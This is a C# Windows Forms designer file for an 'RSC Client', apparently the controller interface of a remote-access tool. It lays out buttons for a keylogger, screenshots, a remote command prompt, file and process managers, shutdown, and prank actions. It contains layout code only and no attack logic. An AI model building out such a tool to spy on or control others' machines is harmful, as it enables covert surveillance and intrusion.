namespace ClientMain
{
    partial class ClientMain
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.buttonDisconnect = new System.Windows.Forms.Button();
            this.label3 = new System.Windows.Forms.Label();
            this.textBoxClientPort = new System.Windows.Forms.TextBox();
            this.buttonConnect = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.textBoxPort = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.textBoxIP = new System.Windows.Forms.TextBox();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.LabelStatus = new System.Windows.Forms.ToolStripStatusLabel();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.buttonGo = new System.Windows.Forms.Button();
            this.textBoxSinPort = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.groupBoxServer = new System.Windows.Forms.GroupBox();
            this.buttonKillServer = new System.Windows.Forms.Button();
            this.buttonCloseServer = new System.Windows.Forms.Button();
            this.groupBoxFun = new System.Windows.Forms.GroupBox();
            this.buttonHideExplorer = new System.Windows.Forms.Button();
            this.buttonCDTray = new System.Windows.Forms.Button();
            this.buttonAudioPlay = new System.Windows.Forms.Button();
            this.groupBoxMisc = new System.Windows.Forms.GroupBox();
            this.buttonCmd = new System.Windows.Forms.Button();
            this.buttonSysInfo = new System.Windows.Forms.Button();
            this.buttonSnapshot = new System.Windows.Forms.Button();
            this.buttonKeylogger = new System.Windows.Forms.Button();
            this.buttonFun = new System.Windows.Forms.Button();
            this.groupBoxWindows = new System.Windows.Forms.GroupBox();
            this.buttonRestart = new System.Windows.Forms.Button();
            this.buttonPoweroff = new System.Windows.Forms.Button();
            this.buttonLogoff = new System.Windows.Forms.Button();
            this.groupBoxManager = new System.Windows.Forms.GroupBox();
            this.buttonProcessManager = new System.Windows.Forms.Button();
            this.buttonFileManager = new System.Windows.Forms.Button();
            this.buttonAbout = new System.Windows.Forms.Button();
            this.buttonServer = new System.Windows.Forms.Button();
            this.buttonMisc = new System.Windows.Forms.Button();
            this.buttonWindows = new System.Windows.Forms.Button();
            this.buttonManagers = new System.Windows.Forms.Button();
            this.textBoxClientIP = new System.Windows.Forms.TextBox();
            this.label5 = new System.Windows.Forms.Label();
            this.openAudioDialog = new System.Windows.Forms.OpenFileDialog();
            this.groupBox1.SuspendLayout();
            this.statusStrip1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.groupBoxServer.SuspendLayout();
            this.groupBoxFun.SuspendLayout();
            this.groupBoxMisc.SuspendLayout();
            this.groupBoxWindows.SuspendLayout();
            this.groupBoxManager.SuspendLayout();
            this.SuspendLayout();
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.buttonDisconnect);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.textBoxClientPort);
            this.groupBox1.Controls.Add(this.buttonConnect);
            this.groupBox1.Controls.Add(this.label2);
            this.groupBox1.Controls.Add(this.textBoxPort);
            this.groupBox1.Controls.Add(this.label1);
            this.groupBox1.Controls.Add(this.textBoxIP);
            this.groupBox1.Location = new System.Drawing.Point(12, 12);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(174, 144);
            this.groupBox1.TabIndex = 4;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Connect To Server";
            // 
            // buttonDisconnect
            // 
            this.buttonDisconnect.Location = new System.Drawing.Point(91, 106);
            this.buttonDisconnect.Name = "buttonDisconnect";
            this.buttonDisconnect.Size = new System.Drawing.Size(70, 23);
            this.buttonDisconnect.TabIndex = 10;
            this.buttonDisconnect.Text = "Disconnect";
            this.buttonDisconnect.UseVisualStyleBackColor = true;
            this.buttonDisconnect.Click += new System.EventHandler(this.buttonDisconnect_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(4, 80);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(58, 13);
            this.label3.TabIndex = 9;
            this.label3.Text = "Client Port:";
            // 
            // textBoxClientPort
            // 
            this.textBoxClientPort.Location = new System.Drawing.Point(68, 77);
            this.textBoxClientPort.Name = "textBoxClientPort";
            this.textBoxClientPort.Size = new System.Drawing.Size(100, 20);
            this.textBoxClientPort.TabIndex = 8;
            // 
            // buttonConnect
            // 
            this.buttonConnect.Location = new System.Drawing.Point(15, 106);
            this.buttonConnect.Name = "buttonConnect";
            this.buttonConnect.Size = new System.Drawing.Size(70, 23);
            this.buttonConnect.TabIndex = 4;
            this.buttonConnect.Text = "Connect";
            this.buttonConnect.UseVisualStyleBackColor = true;
            this.buttonConnect.Click += new System.EventHandler(this.buttonConnect_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(13, 51);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(49, 13);
            this.label2.TabIndex = 7;
            this.label2.Text = "Port No.:";
            // 
            // textBoxPort
            // 
            this.textBoxPort.Location = new System.Drawing.Point(68, 48);
            this.textBoxPort.Name = "textBoxPort";
            this.textBoxPort.Size = new System.Drawing.Size(100, 20);
            this.textBoxPort.TabIndex = 2;
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(8, 24);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(54, 13);
            this.label1.TabIndex = 5;
            this.label1.Text = "Server IP:";
            // 
            // textBoxIP
            // 
            this.textBoxIP.Location = new System.Drawing.Point(68, 19);
            this.textBoxIP.Name = "textBoxIP";
            this.textBoxIP.Size = new System.Drawing.Size(100, 20);
            this.textBoxIP.TabIndex = 1;
            // 
            // statusStrip1
            // 
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripStatusLabel1,
            this.LabelStatus});
            this.statusStrip1.Location = new System.Drawing.Point(0, 223);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(877, 22);
            this.statusStrip1.TabIndex = 5;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(42, 17);
            this.toolStripStatusLabel1.Text = "Status:";
            // 
            // LabelStatus
            // 
            this.LabelStatus.Name = "LabelStatus";
            this.LabelStatus.Size = new System.Drawing.Size(79, 17);
            this.LabelStatus.Text = "Disconnected";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.buttonGo);
            this.groupBox2.Controls.Add(this.textBoxSinPort);
            this.groupBox2.Controls.Add(this.label4);
            this.groupBox2.Location = new System.Drawing.Point(12, 162);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(174, 53);
            this.groupBox2.TabIndex = 6;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "SIN";
            // 
            // buttonGo
            // 
            this.buttonGo.Location = new System.Drawing.Point(124, 17);
            this.buttonGo.Name = "buttonGo";
            this.buttonGo.Size = new System.Drawing.Size(43, 23);
            this.buttonGo.TabIndex = 6;
            this.buttonGo.Text = "Go";
            this.buttonGo.UseVisualStyleBackColor = true;
            this.buttonGo.Click += new System.EventHandler(this.buttonGo_Click);
            // 
            // textBoxSinPort
            // 
            this.textBoxSinPort.Location = new System.Drawing.Point(68, 19);
            this.textBoxSinPort.Name = "textBoxSinPort";
            this.textBoxSinPort.Size = new System.Drawing.Size(50, 20);
            this.textBoxSinPort.TabIndex = 5;
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(13, 22);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(49, 13);
            this.label4.TabIndex = 0;
            this.label4.Text = "Port No.:";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.groupBoxServer);
            this.groupBox3.Controls.Add(this.groupBoxFun);
            this.groupBox3.Controls.Add(this.groupBoxMisc);
            this.groupBox3.Controls.Add(this.buttonFun);
            this.groupBox3.Controls.Add(this.groupBoxWindows);
            this.groupBox3.Controls.Add(this.groupBoxManager);
            this.groupBox3.Controls.Add(this.buttonAbout);
            this.groupBox3.Controls.Add(this.buttonServer);
            this.groupBox3.Controls.Add(this.buttonMisc);
            this.groupBox3.Controls.Add(this.buttonWindows);
            this.groupBox3.Controls.Add(this.buttonManagers);
            this.groupBox3.Location = new System.Drawing.Point(192, 12);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(676, 177);
            this.groupBox3.TabIndex = 7;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Controls";
            // 
            // groupBoxServer
            // 
            this.groupBoxServer.Controls.Add(this.buttonKillServer);
            this.groupBoxServer.Controls.Add(this.buttonCloseServer);
            this.groupBoxServer.Location = new System.Drawing.Point(559, 0);
            this.groupBoxServer.Name = "groupBoxServer";
            this.groupBoxServer.Size = new System.Drawing.Size(112, 80);
            this.groupBoxServer.TabIndex = 16;
            this.groupBoxServer.TabStop = false;
            // 
            // buttonKillServer
            // 
            this.buttonKillServer.Location = new System.Drawing.Point(6, 44);
            this.buttonKillServer.Name = "buttonKillServer";
            this.buttonKillServer.Size = new System.Drawing.Size(100, 23);
            this.buttonKillServer.TabIndex = 2;
            this.buttonKillServer.Text = "Kill Server";
            this.buttonKillServer.UseVisualStyleBackColor = true;
            this.buttonKillServer.Click += new System.EventHandler(this.buttonKillServer_Click);
            // 
            // buttonCloseServer
            // 
            this.buttonCloseServer.Location = new System.Drawing.Point(6, 19);
            this.buttonCloseServer.Name = "buttonCloseServer";
            this.buttonCloseServer.Size = new System.Drawing.Size(100, 23);
            this.buttonCloseServer.TabIndex = 1;
            this.buttonCloseServer.Text = "Close Server";
            this.buttonCloseServer.UseVisualStyleBackColor = true;
            this.buttonCloseServer.Click += new System.EventHandler(this.buttonCloseServer_Click);
            // 
            // groupBoxFun
            // 
            this.groupBoxFun.Controls.Add(this.buttonHideExplorer);
            this.groupBoxFun.Controls.Add(this.buttonCDTray);
            this.groupBoxFun.Controls.Add(this.buttonAudioPlay);
            this.groupBoxFun.Location = new System.Drawing.Point(323, 0);
            this.groupBoxFun.Name = "groupBoxFun";
            this.groupBoxFun.Size = new System.Drawing.Size(112, 105);
            this.groupBoxFun.TabIndex = 12;
            this.groupBoxFun.TabStop = false;
            // 
            // buttonHideExplorer
            // 
            this.buttonHideExplorer.Location = new System.Drawing.Point(6, 19);
            this.buttonHideExplorer.Name = "buttonHideExplorer";
            this.buttonHideExplorer.Size = new System.Drawing.Size(100, 23);
            this.buttonHideExplorer.TabIndex = 3;
            this.buttonHideExplorer.Text = "Hide Explorer";
            this.buttonHideExplorer.UseVisualStyleBackColor = true;
            this.buttonHideExplorer.Click += new System.EventHandler(this.buttonHideExplorer_Click);
            // 
            // buttonCDTray
            // 
            this.buttonCDTray.Location = new System.Drawing.Point(6, 44);
            this.buttonCDTray.Name = "buttonCDTray";
            this.buttonCDTray.Size = new System.Drawing.Size(100, 23);
            this.buttonCDTray.TabIndex = 2;
            this.buttonCDTray.Text = "Open CD Tray";
            this.buttonCDTray.UseVisualStyleBackColor = true;
            this.buttonCDTray.Click += new System.EventHandler(this.buttonCDTray_Click);
            // 
            // buttonAudioPlay
            // 
            this.buttonAudioPlay.Location = new System.Drawing.Point(6, 69);
            this.buttonAudioPlay.Name = "buttonAudioPlay";
            this.buttonAudioPlay.Size = new System.Drawing.Size(100, 23);
            this.buttonAudioPlay.TabIndex = 1;
            this.buttonAudioPlay.Text = "Play Audio";
            this.buttonAudioPlay.UseVisualStyleBackColor = true;
            this.buttonAudioPlay.Click += new System.EventHandler(this.buttonAudioPlay_Click);
            // 
            // groupBoxMisc
            // 
            this.groupBoxMisc.Controls.Add(this.buttonCmd);
            this.groupBoxMisc.Controls.Add(this.buttonSysInfo);
            this.groupBoxMisc.Controls.Add(this.buttonSnapshot);
            this.groupBoxMisc.Controls.Add(this.buttonKeylogger);
            this.groupBoxMisc.Location = new System.Drawing.Point(441, 0);
            this.groupBoxMisc.Name = "groupBoxMisc";
            this.groupBoxMisc.Size = new System.Drawing.Size(112, 130);
            this.groupBoxMisc.TabIndex = 14;
            this.groupBoxMisc.TabStop = false;
            // 
            // buttonCmd
            // 
            this.buttonCmd.Location = new System.Drawing.Point(6, 19);
            this.buttonCmd.Name = "buttonCmd";
            this.buttonCmd.Size = new System.Drawing.Size(100, 23);
            this.buttonCmd.TabIndex = 4;
            this.buttonCmd.Text = "Command Prompt";
            this.buttonCmd.UseVisualStyleBackColor = true;
            this.buttonCmd.Click += new System.EventHandler(this.buttonCmd_Click);
            // 
            // buttonSysInfo
            // 
            this.buttonSysInfo.Location = new System.Drawing.Point(6, 94);
            this.buttonSysInfo.Name = "buttonSysInfo";
            this.buttonSysInfo.Size = new System.Drawing.Size(100, 23);
            this.buttonSysInfo.TabIndex = 3;
            this.buttonSysInfo.Text = "System Info.";
            this.buttonSysInfo.UseVisualStyleBackColor = true;
            this.buttonSysInfo.Click += new System.EventHandler(this.buttonSysInfo_Click);
            // 
            // buttonSnapshot
            // 
            this.buttonSnapshot.Location = new System.Drawing.Point(6, 69);
            this.buttonSnapshot.Name = "buttonSnapshot";
            this.buttonSnapshot.Size = new System.Drawing.Size(100, 23);
            this.buttonSnapshot.TabIndex = 2;
            this.buttonSnapshot.Text = "SnapShot";
            this.buttonSnapshot.UseVisualStyleBackColor = true;
            this.buttonSnapshot.Click += new System.EventHandler(this.buttonSnapshot_Click);
            // 
            // buttonKeylogger
            // 
            this.buttonKeylogger.Location = new System.Drawing.Point(6, 44);
            this.buttonKeylogger.Name = "buttonKeylogger";
            this.buttonKeylogger.Size = new System.Drawing.Size(100, 23);
            this.buttonKeylogger.TabIndex = 1;
            this.buttonKeylogger.Text = "KeyLogger";
            this.buttonKeylogger.UseVisualStyleBackColor = true;
            this.buttonKeylogger.Click += new System.EventHandler(this.buttonKeylogger_Click);
            // 
            // buttonFun
            // 
            this.buttonFun.Location = new System.Drawing.Point(6, 69);
            this.buttonFun.Name = "buttonFun";
            this.buttonFun.Size = new System.Drawing.Size(75, 23);
            this.buttonFun.TabIndex = 11;
            this.buttonFun.Text = "Fun Stuff";
            this.buttonFun.UseVisualStyleBackColor = true;
            this.buttonFun.Click += new System.EventHandler(this.buttonFun_Click);
            // 
            // groupBoxWindows
            // 
            this.groupBoxWindows.Controls.Add(this.buttonRestart);
            this.groupBoxWindows.Controls.Add(this.buttonPoweroff);
            this.groupBoxWindows.Controls.Add(this.buttonLogoff);
            this.groupBoxWindows.Location = new System.Drawing.Point(205, 0);
            this.groupBoxWindows.Name = "groupBoxWindows";
            this.groupBoxWindows.Size = new System.Drawing.Size(112, 105);
            this.groupBoxWindows.TabIndex = 10;
            this.groupBoxWindows.TabStop = false;
            // 
            // buttonRestart
            // 
            this.buttonRestart.Location = new System.Drawing.Point(6, 69);
            this.buttonRestart.Name = "buttonRestart";
            this.buttonRestart.Size = new System.Drawing.Size(100, 23);
            this.buttonRestart.TabIndex = 3;
            this.buttonRestart.Text = "Restart";
            this.buttonRestart.UseVisualStyleBackColor = true;
            this.buttonRestart.Click += new System.EventHandler(this.buttonRestart_Click);
            // 
            // buttonPoweroff
            // 
            this.buttonPoweroff.Location = new System.Drawing.Point(6, 44);
            this.buttonPoweroff.Name = "buttonPoweroff";
            this.buttonPoweroff.Size = new System.Drawing.Size(100, 23);
            this.buttonPoweroff.TabIndex = 2;
            this.buttonPoweroff.Text = "Poweroff";
            this.buttonPoweroff.UseVisualStyleBackColor = true;
            this.buttonPoweroff.Click += new System.EventHandler(this.buttonPoweroff_Click);
            // 
            // buttonLogoff
            // 
            this.buttonLogoff.Location = new System.Drawing.Point(6, 19);
            this.buttonLogoff.Name = "buttonLogoff";
            this.buttonLogoff.Size = new System.Drawing.Size(100, 23);
            this.buttonLogoff.TabIndex = 1;
            this.buttonLogoff.Text = "Log Off";
            this.buttonLogoff.UseVisualStyleBackColor = true;
            this.buttonLogoff.Click += new System.EventHandler(this.buttonLogoff_Click);
            // 
            // groupBoxManager
            // 
            this.groupBoxManager.Controls.Add(this.buttonProcessManager);
            this.groupBoxManager.Controls.Add(this.buttonFileManager);
            this.groupBoxManager.Location = new System.Drawing.Point(87, 0);
            this.groupBoxManager.Name = "groupBoxManager";
            this.groupBoxManager.Size = new System.Drawing.Size(112, 80);
            this.groupBoxManager.TabIndex = 8;
            this.groupBoxManager.TabStop = false;
            // 
            // buttonProcessManager
            // 
            this.buttonProcessManager.Location = new System.Drawing.Point(6, 44);
            this.buttonProcessManager.Name = "buttonProcessManager";
            this.buttonProcessManager.Size = new System.Drawing.Size(100, 23);
            this.buttonProcessManager.TabIndex = 2;
            this.buttonProcessManager.Text = "Process Manager";
            this.buttonProcessManager.UseVisualStyleBackColor = true;
            this.buttonProcessManager.Click += new System.EventHandler(this.buttonProcessManager_Click);
            // 
            // buttonFileManager
            // 
            this.buttonFileManager.Location = new System.Drawing.Point(6, 19);
            this.buttonFileManager.Name = "buttonFileManager";
            this.buttonFileManager.Size = new System.Drawing.Size(100, 23);
            this.buttonFileManager.TabIndex = 1;
            this.buttonFileManager.Text = "File Manager";
            this.buttonFileManager.UseVisualStyleBackColor = true;
            this.buttonFileManager.Click += new System.EventHandler(this.buttonFileManager_Click);
            // 
            // buttonAbout
            // 
            this.buttonAbout.Location = new System.Drawing.Point(6, 144);
            this.buttonAbout.Name = "buttonAbout";
            this.buttonAbout.Size = new System.Drawing.Size(75, 23);
            this.buttonAbout.TabIndex = 17;
            this.buttonAbout.Text = "About";
            this.buttonAbout.UseVisualStyleBackColor = true;
            this.buttonAbout.Click += new System.EventHandler(this.buttonAbout_Click);
            // 
            // buttonServer
            // 
            this.buttonServer.Location = new System.Drawing.Point(6, 119);
            this.buttonServer.Name = "buttonServer";
            this.buttonServer.Size = new System.Drawing.Size(75, 23);
            this.buttonServer.TabIndex = 15;
            this.buttonServer.Text = "Server";
            this.buttonServer.UseVisualStyleBackColor = true;
            this.buttonServer.Click += new System.EventHandler(this.buttonServer_Click);
            // 
            // buttonMisc
            // 
            this.buttonMisc.Location = new System.Drawing.Point(6, 94);
            this.buttonMisc.Name = "buttonMisc";
            this.buttonMisc.Size = new System.Drawing.Size(75, 23);
            this.buttonMisc.TabIndex = 13;
            this.buttonMisc.Text = "Misc.";
            this.buttonMisc.UseVisualStyleBackColor = true;
            this.buttonMisc.Click += new System.EventHandler(this.buttonMisc_Click);
            // 
            // buttonWindows
            // 
            this.buttonWindows.Location = new System.Drawing.Point(6, 44);
            this.buttonWindows.Name = "buttonWindows";
            this.buttonWindows.Size = new System.Drawing.Size(75, 23);
            this.buttonWindows.TabIndex = 9;
            this.buttonWindows.Text = "Windows";
            this.buttonWindows.UseVisualStyleBackColor = true;
            this.buttonWindows.Click += new System.EventHandler(this.buttonWindows_Click);
            // 
            // buttonManagers
            // 
            this.buttonManagers.Location = new System.Drawing.Point(6, 19);
            this.buttonManagers.Name = "buttonManagers";
            this.buttonManagers.Size = new System.Drawing.Size(75, 23);
            this.buttonManagers.TabIndex = 7;
            this.buttonManagers.Text = "Managers";
            this.buttonManagers.UseVisualStyleBackColor = true;
            this.buttonManagers.Click += new System.EventHandler(this.buttonManagers_Click);
            // 
            // textBoxClientIP
            // 
            this.textBoxClientIP.Location = new System.Drawing.Point(250, 195);
            this.textBoxClientIP.Name = "textBoxClientIP";
            this.textBoxClientIP.Size = new System.Drawing.Size(100, 20);
            this.textBoxClientIP.TabIndex = 8;
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(195, 198);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(49, 13);
            this.label5.TabIndex = 7;
            this.label5.Text = "Client IP:";
            // 
            // openAudioDialog
            // 
            this.openAudioDialog.FileName = "openFileDialog1";
            this.openAudioDialog.Filter = "WAV Files|*.wav";
            // 
            // ClientMain
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(877, 245);
            this.Controls.Add(this.textBoxClientIP);
            this.Controls.Add(this.groupBox3);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.statusStrip1);
            this.Controls.Add(this.groupBox1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "ClientMain";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "RSC Client";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.ClientMain_FormClosing);
            this.Load += new System.EventHandler(this.ClientMain_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBoxServer.ResumeLayout(false);
            this.groupBoxFun.ResumeLayout(false);
            this.groupBoxMisc.ResumeLayout(false);
            this.groupBoxWindows.ResumeLayout(false);
            this.groupBoxManager.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Button buttonConnect;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox textBoxPort;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox textBoxIP;
        private System.Windows.Forms.StatusStrip statusStrip1;
        private System.Windows.Forms.ToolStripStatusLabel toolStripStatusLabel1;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Button buttonGo;
        private System.Windows.Forms.TextBox textBoxSinPort;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.ToolStripStatusLabel LabelStatus;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.Button buttonAbout;
        private System.Windows.Forms.Button buttonServer;
        private System.Windows.Forms.Button buttonMisc;
        private System.Windows.Forms.Button buttonWindows;
        private System.Windows.Forms.Button buttonManagers;
        private System.Windows.Forms.GroupBox groupBoxManager;
        private System.Windows.Forms.Button buttonProcessManager;
        private System.Windows.Forms.Button buttonFileManager;
        private System.Windows.Forms.GroupBox groupBoxWindows;
        private System.Windows.Forms.Button buttonRestart;
        private System.Windows.Forms.Button buttonPoweroff;
        private System.Windows.Forms.Button buttonLogoff;
        private System.Windows.Forms.Button buttonFun;
        private System.Windows.Forms.GroupBox groupBoxServer;
        private System.Windows.Forms.Button buttonKillServer;
        private System.Windows.Forms.Button buttonCloseServer;
        private System.Windows.Forms.GroupBox groupBoxFun;
        private System.Windows.Forms.Button buttonHideExplorer;
        private System.Windows.Forms.Button buttonCDTray;
        private System.Windows.Forms.Button buttonAudioPlay;
        private System.Windows.Forms.GroupBox groupBoxMisc;
        private System.Windows.Forms.Button buttonSysInfo;
        private System.Windows.Forms.Button buttonSnapshot;
        private System.Windows.Forms.Button buttonKeylogger;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.TextBox textBoxClientPort;
        private System.Windows.Forms.TextBox textBoxClientIP;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Button buttonDisconnect;
        private System.Windows.Forms.OpenFileDialog openAudioDialog;
        private System.Windows.Forms.Button buttonCmd;
    }
}

